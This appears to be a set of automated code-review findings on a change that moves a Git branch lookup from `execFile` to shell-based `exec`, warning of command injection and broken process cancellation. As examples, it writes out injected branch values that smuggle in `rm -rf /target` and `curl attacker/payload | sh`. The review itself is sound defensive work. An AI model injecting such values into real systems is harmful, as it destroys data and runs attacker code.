findings.title: [P1] Pass the branch as a literal Git argument
findings.body: When `branch` contains shell syntax, `exec` interprets it instead of passing it literally to Git. For example, `HEAD; arbitrary-command` executes the appended command with the application's privileges and can replace Git's exit status. Retain `execFile("git", ["show", branch])` or another shell-free API.

findings.title: [P2] Preserve cancellation of the Git child process
findings.body: On POSIX, cancelling the returned `ChildProcess` now signals the intermediary shell rather than the spawned Git process. The Git descendant can remain alive, consuming resources or holding output pipes open. Returning the directly spawned Git process preserves the previous cancellation behavior.

findings.title: [P1] Preserve Git as the sole command controlling completion
findings.body:
`exec` shell-parses `branch`, so valid ref names containing metacharacters alter command ordering and terminal status. For example, `main;false` runs `git show main` followed by `false`, causing a successful Git operation to emit failure; `missing;true` emits success after Git fails. It can also launch unintended background work.

_Recommend validating this comment independently._

findings.title: [P2] Keep cancellation attached to the Git process
findings.body:
`exec` returns the shell process rather than the spawned Git process. On platforms where the shell launches Git as a descendant, calling `.kill()` on the returned `ChildProcess` can terminate only the shell, leaving a long-running `git show` alive and potentially delaying stream closure while it continues consuming resources. The previous `execFile` child was Git itself.

_Recommend validating this comment independently._

findings.title: [P1] Keep the branch argument out of the shell
findings.body:
`exec` interpolates `branch` into a shell command, enabling arbitrary command execution. For example, on POSIX, `showBranch("HEAD; rm -rf /target")` executes the appended command, whereas `execFile` passed the value as a literal argument.

_Recommend validating this comment independently._

findings.title: [P1] Pass the branch as an argument instead of interpolating it into a shell command
findings.body:
Any attacker-controlled `branch` value containing shell syntax, such as `main; curl attacker/payload | sh`, executes arbitrary commands with the application’s privileges on systems using a shell. The previous `execFile` call passed the value directly to Git without shell interpretation.

_Recommend validating this comment independently._
